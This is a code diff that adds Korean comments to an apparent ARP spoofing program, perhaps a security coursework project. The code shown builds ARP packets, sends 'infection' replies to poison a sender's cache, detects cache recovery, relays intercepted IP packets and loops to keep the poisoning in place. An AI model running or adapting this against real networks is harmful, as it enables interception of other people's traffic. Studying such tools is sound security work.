@@ -25,13 +25,14 @@ struct EthArpPacket {
 };
 #pragma pack(pop)
 
+// Sender, target으로 묶어서 저장
 struct Flow {
     Ip senderIp;
     Mac senderMac;
     Ip targetIp;
     Mac targetMac;
 };
-
+// MyMac 주소 읽기
 Mac getMyMac(const char* dev) {
     struct ifreq ifr;
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
@@ -42,15 +43,14 @@ Mac getMyMac(const char* dev) {
         return Mac::nullMac();
     }
     close(sock);
-    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
+    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data); // mac주소 받음
 }
-
+// ARP 응답 요청
 Mac getMacByArp(pcap_t* handle, Mac myMac, Ip ip) {
     EthArpPacket packet;
     packet.eth_.dmac_ = Mac::broadcastMac();
     packet.eth_.smac_ = myMac;
     packet.eth_.type_ = htons(EthHdr::Arp);
-
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::Size;
@@ -80,13 +80,12 @@ Mac getMacByArp(pcap_t* handle, Mac myMac, Ip ip) {
         return rep->arp_.smac_;
     }
 }
-
+// 감염 패킷 전송
 void sendArpInfect(pcap_t* handle, Mac myMac, const Flow& flow) {
     EthArpPacket packet;
     packet.eth_.dmac_ = flow.senderMac;
     packet.eth_.smac_ = myMac;
     packet.eth_.type_ = htons(EthHdr::Arp);
-
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::Size;
@@ -99,7 +98,7 @@ void sendArpInfect(pcap_t* handle, Mac myMac, const Flow& flow) {
 
     pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
 }
-
+//mac 복구 검사
 bool detectRecover(const u_char* packet, const Flow& flow) {
     auto* eth = (EthHdr*)packet;
     if (eth->type() != EthHdr::Arp) return false;
@@ -129,7 +128,7 @@ void relayIpPacket(pcap_t* handle, const u_char* packet, int len, const Flow& fl
     delete[] relay;
 }
 
-//     ARP 감염 상태를 유지한다.
+//ARP 감염 상태를 유지한다.
 void maintainInfection(pcap_t* handle, Mac myMac, const std::vector<Flow>& flows) {
     while (true) {
         for (const auto& f : flows) {
